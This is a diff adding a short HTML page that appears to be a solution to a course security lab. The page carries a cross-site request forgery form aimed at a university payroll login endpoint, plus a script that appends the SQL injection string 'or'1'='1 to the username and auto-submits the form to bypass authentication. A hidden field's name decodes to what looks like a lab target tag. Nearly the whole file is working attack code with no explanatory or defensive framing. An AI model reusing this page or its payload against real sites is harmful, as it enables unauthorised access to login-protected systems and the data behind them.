@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+		<body>
+			<form action="http://payroll.gatech.edu/index.php" method="POST" onsubmit="sqlattack();">
+				<input type="hidden" name="action" value="login"/>
+				<input type="hidden" name="RmFsbDIwMTlUYXJnZXQzRWFzdGVyRWdnLUl0J3NBU2VjcmV0DQo" value="RmFsbDIwMTlUYXJnZXQzRWFzdGVyRWdnLUl0J3NBU2VjcmV0DQo" />
+				<input name="login" id="targetlogin" value="username" />
+                        	<button id="exploit">Hold onto your butts!</button>
+			</form>
+			<script>
+				function sqlattack(){
+					var log_val = document.getElementById("targetlogin");
+					log_val.value = log_val.value + "'or'1'='1";
+					document.forms[0].submit();
+				}
+			</script>
+		</body>
+</html>
